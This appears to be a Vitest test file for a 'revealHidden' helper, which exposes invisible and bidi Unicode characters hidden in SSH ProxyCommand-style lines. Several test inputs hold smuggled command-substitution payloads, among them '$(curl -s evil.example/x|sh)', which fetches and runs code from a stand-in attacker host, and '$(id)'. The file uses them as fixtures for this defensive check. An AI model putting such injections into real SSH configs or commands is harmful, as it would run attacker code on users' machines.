import { describe, expect, it } from "vitest";

import { revealHidden } from "./reveal-hidden";

describe("revealHidden", () => {
  it("shows the characters that could make a line read differently from what ssh runs", () => {
    expect(revealHidden("nc %h 22 #\u202Eevil")).toBe("nc %h 22 #⟨U+202E⟩evil"); // right-to-left override
    expect(revealHidden("a\u200Bb\u2066c\u2069")).toBe("a⟨U+200B⟩b⟨U+2066⟩c⟨U+2069⟩"); // zero-width space, isolates
    expect(revealHidden("x\u00A0y\uFEFFz\u0007")).toBe("x⟨U+00A0⟩y⟨U+FEFF⟩z⟨U+0007⟩");
  });

  it("leaves ordinary text alone, tabs and non-Latin letters included", () => {
    expect(revealHidden("\tProxyCommand nc café 日本 %h")).toBe("\tProxyCommand nc café 日本 %h");
  });
});

describe("revealHidden: letters and marks that draw nothing", () => {
  it("shows the ones that are not format characters or spaces either: fillers, selectors, joiners, the blank Braille cell", () => {
    const cases: [number, string][] = [
      [0x115f, "⟨U+115F⟩"], // Hangul choseong filler
      [0x1160, "⟨U+1160⟩"], // Hangul jungseong filler
      [0x3164, "⟨U+3164⟩"], // Hangul filler
      [0xffa0, "⟨U+FFA0⟩"], // halfwidth Hangul filler
      [0x034f, "⟨U+034F⟩"], // combining grapheme joiner
      [0xfe0f, "⟨U+FE0F⟩"], // variation selector-16
      [0x180b, "⟨U+180B⟩"], // Mongolian free variation selector
      [0x2800, "⟨U+2800⟩"], // Braille pattern blank
      [0xe0100, "⟨U+E0100⟩"], // variation selector supplement, outside the BMP
    ];
    for (const [code, shown] of cases) {
      expect(revealHidden(`bastion${String.fromCodePoint(code)}#x`), shown).toBe(`bastion${shown}#x`);
    }
  });

  it("still shows what it showed before: bidi controls, zero-width and format characters, controls, non-ASCII spaces, separators", () => {
    expect(revealHidden("a\u{202E}b\u{200B}c\u{2066}d\u{AD}e\u{85}f\u{A0}g\u{3000}h\u{2028}i\u{2029}j")).toBe(
      "a⟨U+202E⟩b⟨U+200B⟩c⟨U+2066⟩d⟨U+00AD⟩e⟨U+0085⟩f⟨U+00A0⟩g⟨U+3000⟩h⟨U+2028⟩i⟨U+2029⟩j",
    );
  });

  it("shows the blank-by-design characters that are neither default-ignorable nor marks: the null notehead, the blank hieroglyphs, the ideographic half fill space", () => {
    const cases: [number, string][] = [
      [0x1d159, "⟨U+1D159⟩"], // musical null notehead
      [0x13441, "⟨U+13441⟩"], // Egyptian hieroglyph full blank
      [0x13442, "⟨U+13442⟩"], // Egyptian hieroglyph half blank
      [0x303f, "⟨U+303F⟩"], // ideographic half fill space (a symbol, not a space separator)
    ];
    for (const [code, shown] of cases) {
      expect(revealHidden(`bastion${String.fromCodePoint(code)}#x`), shown).toBe(`bastion${shown}#x`);
    }
  });

  it("shows a combining mark that has no letter or digit to sit on: after a space, a metacharacter, `=`, a tab or a line start", () => {
    const acute = "\u{301}";
    expect(revealHidden(`nc %h %p;${acute}#$(curl -s evil.example/x|sh)`)).toBe("nc %h %p;⟨U+0301⟩#$(curl -s evil.example/x|sh)");
    expect(revealHidden(`ProxyCommand=${acute}#$(id)`)).toBe("ProxyCommand=⟨U+0301⟩#$(id)");
    expect(revealHidden(`bastion ${acute}#$(id)`)).toBe("bastion ⟨U+0301⟩#$(id)");
    expect(revealHidden(`a\t${acute}#`)).toBe("a\t⟨U+0301⟩#");
    expect(revealHidden(`${acute}#x`)).toBe("⟨U+0301⟩#x");
    expect(revealHidden(`x|${acute}#`)).toBe("x|⟨U+0301⟩#");
    // The Khitan filler is a mark too (not default-ignorable), so it is shown wherever it has no base.
    expect(revealHidden("bastion \u{16FE4}#x")).toBe("bastion ⟨U+16FE4⟩#x");
  });

  it("shows every mark of a run that has no base, and a mark that follows a character that was just shown", () => {
    expect(revealHidden("a;\u{301}\u{302}\u{323}#")).toBe("a;⟨U+0301⟩⟨U+0302⟩⟨U+0323⟩#");
    // The Hangul filler is shown as a code, so a mark after it has nothing to sit on either.
    expect(revealHidden("a\u{3164}\u{301}b")).toBe("a⟨U+3164⟩⟨U+0301⟩b");
    expect(revealHidden("a\u{200B}\u{301}b")).toBe("a⟨U+200B⟩⟨U+0301⟩b");
  });

  it("leaves legitimate accents alone: marks on letters and digits, stacked marks, Devanagari and Thai words", () => {
    const plain = [
      "cafe\u{301} nc", // a decomposed é
      "e\u{301}\u{323}", // stacked marks on one letter
      "1\u{301}2", // a digit can carry a mark
      "\u{928}\u{92E}\u{938}\u{94D}\u{924}\u{947}", // Devanagari: consonants, virama, vowel sign
      "\u{E2A}\u{E27}\u{E31}\u{E2A}\u{E14}\u{E35}", // Thai: consonants with vowel marks
      "\u{E9}", // a precomposed é
    ];
    for (const text of plain) expect(revealHidden(text), text).toBe(text);
    // The same accent is shown once a space (not a letter) is what it follows.
    expect(revealHidden("cafe\u{301} \u{301}")).toBe("cafe\u{301} ⟨U+0301⟩");
  });
});
